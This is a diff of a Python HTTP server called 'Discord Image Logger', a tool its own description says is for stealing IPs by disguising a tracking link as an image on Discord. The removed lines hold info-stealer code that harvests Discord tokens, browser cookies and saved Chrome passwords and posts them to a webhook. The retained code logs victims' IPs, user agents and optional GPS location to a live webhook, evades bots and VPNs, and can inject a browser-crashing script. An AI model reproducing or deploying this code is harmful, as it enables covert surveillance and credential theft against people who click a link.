@@ -1,100 +1,70 @@
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, os, re, json, sqlite3, shutil, browser_cookie3
+import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0" 
+__version__ = "v2.0"
 __author__ = "DeKrypt"
 
-def get_tokens():
-    tokens = []
-    paths = {
-        'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
-        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
-        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
-    }
-    
-    for platform, path in paths.items():
-        if not os.path.exists(path): continue
-        tokens.extend(find_tokens(path))
-    return tokens
-
-def find_tokens(path):
-    tokens = []
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
-
-def get_cookies():
-    cookies = []
-    browsers = [
-        (browser_cookie3.chrome, 'Chrome'),
-        (browser_cookie3.firefox, 'Firefox'),
-        (browser_cookie3.edge, 'Edge'),
-        (browser_cookie3.opera, 'Opera')
-    ]
-    
-    for browser_func, name in browsers:
-        try:
-            browser_cookies = browser_func(domain_name='')
-            cookies.extend([{'browser': name, 'name': c.name, 'value': c.value, 'domain': c.domain} for c in browser_cookies])
-        except:
-            continue
-    return cookies
-
-def get_passwords():
-    passwords = []
-    if os.name == 'nt':
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-        
-        if os.path.exists(local_state_path) and os.path.exists(login_db_path):
-            shutil.copy2(login_db_path, "LoginData.db")
-            conn = sqlite3.connect("LoginData.db")
-            cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                for row in cursor.fetchall():
-                    passwords.append({
-                        'url': row[0],
-                        'username': row[1],
-                        'password': row[2]  # Note: This is encrypted, would need key from Local State to decrypt
-                    })
-            except:
-                pass
-            conn.close()
-            os.remove("LoginData.db")
-    return passwords
-
 config = {
+    # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335307399405502626/MsUfNzyRoBvoN8pJ1UTdPycbADVNPGU1jVdfLV5LyW_uZrf2e3fx8Zg6L4zSdRjZJVGX",
-    "image": "https://i.redd.it/funniest-cat-pictures-you-have-v0-cvk0vuc0hj5a1.jpg?width=3000&format=pjpg&auto=webp&s=73c395c63462f04c52e1550559dfb9809dd2a599",
-    "imageArgument": True,
-    "username": "Image Logger",
-    "color": 0x00FFFF,
-    "crashBrowser": False,
-    "accurateLocation": False,
-    "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
-        "richMessage": True,
+    "image": "https://i.redd.it/funniest-cat-pictures-you-have-v0-cvk0vuc0hj5a1.jpg?width=3000&format=pjpg&auto=webp&s=73c395c63462f04c52e1550559dfb9809dd2a599", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
-    "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1,
+
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
+
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
+
+    # REDIRECTION #
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
+
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164")
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -112,7 +82,7 @@ def reportError(error):
         {
             "title": "Image Logger - Error",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n\n{error}\n",
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -134,7 +104,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
     ping = "@everyone"
@@ -166,12 +136,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
+
     os, browser = httpagentparser.simple_detect(useragent)
-    
-    # Get additional data
-    tokens = get_tokens()
-    cookies = get_cookies()
-    passwords = get_passwords()
     
     embed = {
     "username": config["username"],
@@ -201,24 +167,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
-**Discord Tokens:**
-
-{tokens if tokens else 'No tokens found'}
-
-
-**Cookies:**
-
-{json.dumps(cookies, indent=2) if cookies else 'No cookies found'}
-
-
-**Saved Passwords:**
-
-{json.dumps(passwords, indent=2) if passwords else 'No passwords found'}
-
-
 **User Agent:**
+```
 {useragent}
-""",
+```""",
     }
   ],
 }
@@ -229,6 +181,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -262,11 +217,11 @@ height: 100vh;
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
@@ -282,6 +237,7 @@ height: 100vh;
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                 
+
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
@@ -306,17 +262,18 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200)
-                self.send_header('Content-type', datatype)
-                self.end_headers()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
                     data += b"""<script>
 var currenturl = window.location.href;
+
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (coords) {
@@ -327,6 +284,7 @@ if (!currenturl.includes("g=")) {
     }
     location.replace(currenturl);});
 }}
+
 </script>"""
                 self.wfile.write(data)
         
